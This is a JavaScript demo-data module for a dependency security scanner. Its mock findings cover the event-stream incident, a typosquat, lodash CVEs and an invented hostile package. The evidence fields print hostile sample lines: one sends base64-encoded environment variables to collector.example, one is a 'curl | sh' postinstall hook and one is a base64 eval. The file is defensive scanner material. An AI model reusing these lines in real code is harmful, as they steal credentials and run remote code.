// Demo data used only when the backend (app/api/**) is not reachable.
// It mirrors the "trap-app" scenario from plan/DEMO.md and the shapes in plan/DATA_MODEL.md.

const HASH = "9f2c1ad04b7e5d38c6a10f4e2b9d7a53e8c01b46f7d2a9e53c18b0a4d6e7f291";

const AGENT = "7xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU";
const SIG = "5VERv8NMvzbJMEkV8xnrLkEaWRtSFPJTZ6Qv1ZkY2gZ9uQy3sDkX7mJ1bq4L8hT2cN6wRzP9eYf3aUoKxMdHnS4";
let agentRegistered = false;

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const findings = [
  {
    id: "f-1", type: "malicious", severity: "critical",
    title: "Known malicious package: event-stream@3.3.6",
    description: "event-stream 3.3.6 pulls in flatmap-stream, which contains an encrypted payload targeting the Copay bitcoin wallet. It runs when the package is loaded and steals private keys.",
    package: "event-stream", version: "3.3.6", ecosystem: "npm", file: "package-lock.json", line: 214,
    evidence: '"event-stream": {\n  "version": "3.3.6",\n  "requires": { "flatmap-stream": "^0.1.0" }\n}',
    source: "snowflake", references: ["https://github.com/dominictarr/event-stream/issues/116"], fix: "Remove event-stream or pin to 3.3.4, then rotate any secrets that were exposed.", ruleId: "MAL-2018-0001",
  },
  {
    id: "f-2", type: "typosquat", severity: "high",
    title: "Possible typosquat of cross-env: crossenv",
    description: "crossenv is one letter-separator away from the popular cross-env package. In 2017 a package with this exact name stole environment variables on install.",
    package: "crossenv", version: "1.0.0", ecosystem: "npm", file: "package.json", line: 9,
    evidence: '"dependencies": {\n  "crossenv": "^1.0.0"\n}',
    source: "heuristic", references: [], fix: "Replace with cross-env.", ruleId: "typosquat",
  },
  {
    id: "f-3", type: "suspicious-code", severity: "high",
    title: "Environment variables sent over the network",
    description: "This file reads process.env and makes an outbound HTTP request in the same file, a common credential exfiltration pattern.",
    package: "left-padder", version: "2.1.0", ecosystem: "npm", file: "node_modules/left-padder/index.js", line: 8,
    evidence: "const data = JSON.stringify(process.env);\nhttps.get('https://collector.example/c?d=' + Buffer.from(data).toString('base64'));",
    source: "heuristic", references: [], fix: "Remove left-padder and rotate every secret the build machine could read.", ruleId: "env-exfiltration",
  },
  {
    id: "f-4", type: "install-script", severity: "high",
    title: "postinstall downloads and runs a remote script",
    description: "The postinstall hook pipes curl straight into sh. Anything the server returns runs on your machine at install time.",
    package: "left-padder", version: "2.1.0", ecosystem: "npm", file: "node_modules/left-padder/package.json", line: 6,
    evidence: '"scripts": {\n  "postinstall": "curl -s https://cdn.example/setup.sh | sh"\n}',
    source: "heuristic", references: [], fix: "Install with --ignore-scripts and remove the package.", ruleId: "remote-shell",
  },
  {
    id: "f-5", type: "suspicious-code", severity: "high",
    title: "Obfuscated eval of decoded payload",
    description: "eval() runs a string decoded from base64 at runtime. Legitimate libraries almost never need this.",
    package: "left-padder", version: "2.1.0", ecosystem: "npm", file: "node_modules/left-padder/lib/boot.js", line: 3,
    evidence: "eval(Buffer.from('Y29uc29sZS5sb2coJ3B3bmVkJyk=', 'base64').toString());",
    source: "heuristic", references: [], fix: "Remove the package.", ruleId: "obfuscated-eval",
  },
  {
    id: "f-6", type: "vulnerability", severity: "high",
    title: "Prototype Pollution in lodash",
    description: "Versions of lodash before 4.17.21 are vulnerable to prototype pollution through zipObjectDeep, letting an attacker modify Object.prototype.",
    package: "lodash", version: "4.17.15", ecosystem: "npm", file: "package-lock.json", line: 120,
    evidence: '"lodash": { "version": "4.17.15" }',
    source: "osv", references: ["https://github.com/advisories/GHSA-p6mc-m468-83gw", "https://nvd.nist.gov/vuln/detail/CVE-2020-8203"], fix: "Upgrade to 4.17.21", ruleId: "GHSA-p6mc-m468-83gw",
  },
  {
    id: "f-7", type: "vulnerability", severity: "critical",
    title: "Command Injection in lodash template",
    description: "lodash.template in versions before 4.17.21 allows command injection via the template option.",
    package: "lodash", version: "4.17.15", ecosystem: "npm", file: "package-lock.json", line: 120,
    evidence: '"lodash": { "version": "4.17.15" }',
    source: "osv", references: ["https://github.com/advisories/GHSA-35jh-r3h4-6jhm"], fix: "Upgrade to 4.17.21", ruleId: "GHSA-35jh-r3h4-6jhm",
  },
  {
    id: "f-8", type: "suspicious-code", severity: "medium",
    title: "Child process combined with network access",
    description: "This file spawns child processes and makes network calls, which together can download and execute code.",
    package: "build-helper", version: "0.4.2", ecosystem: "npm", file: "scripts/build.js", line: 21,
    evidence: "exec('node ' + tmpFile);",
    source: "heuristic", references: [], fix: "Review the script and pin any URL it downloads from.", ruleId: "child-process-network",
  },
  {
    id: "f-9", type: "install-script", severity: "low",
    title: "Root project defines a postinstall script",
    description: "The root package.json runs a script after install. This one only runs node scripts/setup.js.",
    package: "trap-app", version: "1.0.0", ecosystem: "npm", file: "package.json", line: 14,
    evidence: '"postinstall": "node scripts/setup.js"',
    source: "heuristic", references: [], fix: "No action needed unless you do not recognise the script.", ruleId: "install-script",
  },
];

const dependencies = [
  ["lodash", "4.17.15", "^4.17.15", "package-lock.json", true, 0, false],
  ["event-stream", "3.3.6", "^3.3.6", "package-lock.json", true, 0, false],
  ["crossenv", "1.0.0", "^1.0.0", "package.json", true, 0, false],
  ["express", "4.18.2", "^4.18.2", "package-lock.json", true, 0, false],
  ["left-padder", "2.1.0", "^2.1.0", "package-lock.json", false, 2, false],
  ["flatmap-stream", "0.1.1", "^0.1.0", "package-lock.json", false, 1, false],
  ["build-helper", "0.4.2", "^0.4.0", "package-lock.json", false, 1, true],
  ["debug", "4.3.4", "^4.3.4", "package-lock.json", false, 1, false],
  ["ms", "2.1.2", "2.1.2", "package-lock.json", false, 2, false],
  ["jest", "29.7.0", "^29.7.0", "package-lock.json", true, 0, true],
  ["requests", "2.31.0", "==2.31.0", "requirements.txt", true, 0, false],
].map(([name, version, range, file, direct, depth, dev]) => ({
  name, version, range, ecosystem: name === "requests" ? "PyPI" : "npm", file, direct, depth, dev,
}));

const counts = findings.reduce((acc, f) => ({ ...acc, [f.severity]: (acc[f.severity] || 0) + 1 }), { critical: 0, high: 0, medium: 0, low: 0 });

function makeReport(target, source = "upload") {
  const id = "demo" + Math.random().toString(36).slice(2, 8);
  return {
    scanId: id,
    createdAt: new Date().toISOString(),
    source,
    target,
    stats: { files: 31, manifests: 4, dependencies: dependencies.length, direct: dependencies.filter((d) => d.direct).length, transitive: dependencies.filter((d) => !d.direct).length, ecosystems: { npm: 10, PyPI: 1 } },
    dependencies,
    findings,
    summary: { score: 100, level: "critical", counts },
    ai: {
      mode: "fallback",
      model: "template",
      summary:
        "### What we found\n\nThis project has **2 critical** and **5 high** risk issues. Two of them point to an active supply-chain attack, not just an old bug.\n\n### Fix these first\n\n1. **`event-stream@3.3.6`** is a known malicious release. It was used to steal bitcoin wallet keys. Remove it and rotate any secrets that were on a machine that installed it.\n2. **`left-padder`** reads `process.env`, sends it to an external server and runs a `curl | sh` postinstall. Treat it as hostile.\n3. **`crossenv`** looks like a typo of `cross-env`. Swap it for the real package.\n4. **`lodash@4.17.15`** has known CVEs. Upgrading to `4.17.21` fixes both.\n\n### Next time\n\nInstall with `--ignore-scripts`, and check new dependency names before adding them.",
    },
    warnings: ["Backend not connected. This is demo data, not a real scan."],
    reportHash: HASH,
  };
}

const store = new Map();

const explanations = {
  "f-3": "### What it is\n\nThis file reads **every environment variable** (`process.env`), base64-encodes it and sends it to `collector.example`.\n\n### Why it is dangerous\n\nEnvironment variables usually hold secrets: API keys, database passwords, cloud credentials. Anyone running the collector now has them.\n\n### How to fix it\n\n- Remove `left-padder` from `package.json` and `package-lock.json`.\n- Rotate every secret that was available where the package ran, including CI.\n\n### How to avoid it next time\n\nA string-padding helper should never need network access. If a tiny utility makes network calls, that is a red flag.",
};

function genericExplanation(f) {
  return `### What it is\n\n${f.description}\n\n### How to fix it\n\n${f.fix || "Review and remove the dependency."}\n\n### How to avoid it next time\n\nReview new dependencies before adding them, prefer well-known maintainers and install with \`--ignore-scripts\`.`;
}

export async function mockRequest(path, opts = {}) {
  const method = (opts.method || "GET").toUpperCase();
  const body = opts.body ? JSON.parse(opts.body) : {};
  await sleep(method === "GET" ? 250 : 900);

  if (path === "/api/health") {
    return { ok: true, ai: "gemma-4-31b-it", aiEnabled: false, snowflake: false, anthropic: false };
  }

  if (path === "/api/scan/github" || path === "/api/scan/upload") {
    await sleep(2800);
    const target = path.endsWith("github") ? `${String(body.repo || "owner/repo").replace(/^https?:\/\/github\.com\//, "")}@${body.branch || "main"}` : `upload:${body.name || "project"}`;
    const report = makeReport(target, path.endsWith("github") ? "github" : "upload");
    store.set(report.scanId, report);
    return report;
  }

  if (path === "/api/reports") {
    return [...store.values()].reverse().map(({ dependencies: _d, findings: _f, ai: _a, ...rest }) => rest);
  }

  let m;
  if ((m = path.match(/^\/api\/reports\/([^/]+)$/))) {
    const r = store.get(m[1]);
    if (!r) throw Object.assign(new Error("Report not found."), { status: 404 });
    return r;
  }

  if (path === "/api/summary") {
    await sleep(1500);
    return { mode: "fallback", model: "template", summary: makeReport("x").ai.summary };
  }

  if (path === "/api/explain") {
    const r = store.get(body.scanId);
    const f = r?.findings.find((x) => x.id === body.findingId);
    return { explanation: explanations[body.findingId] || (f ? genericExplanation(f) : "### Demo explanation\n\n`/api/explain` is not live yet. When it is, Gemma 4 will explain this finding here."), mode: "fallback" };
  }

  if (path === "/api/agent" || path === "/api/agent/register") {
    if (path.endsWith("register")) agentRegistered = true;
    return { publicKey: AGENT, balance: 0, mode: "simulated", registered: agentRegistered, registrationSignature: agentRegistered ? SIG : null };
  }
  if (path === "/api/agent/history") {
    return agentRegistered ? [{ signature: SIG, memo: '{"t":"agent_register","name":"code-muhafiz"}', timestamp: new Date().toISOString() }] : [];
  }

  throw Object.assign(new Error("Not found."), { status: 404 });
}
